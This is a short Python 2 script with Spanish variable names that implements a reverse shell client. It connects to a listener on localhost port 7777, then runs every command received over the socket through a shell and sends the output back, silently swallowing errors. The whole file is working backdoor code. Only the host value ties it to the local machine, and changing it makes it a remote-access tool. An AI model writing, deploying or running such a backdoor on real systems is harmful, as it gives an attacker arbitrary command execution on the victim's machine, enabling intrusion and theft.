#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess

cliente = socket.socket()

try:
	cliente.connect(('localhost',7777))
	cliente.send("1")

	while True:
		c = cliente.recv(1024)
		comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		if comando.stderr.read() != "":
			cliente.send("error de comando")
		else:
			cliente.send(comando.stdout.read())
except:
	pass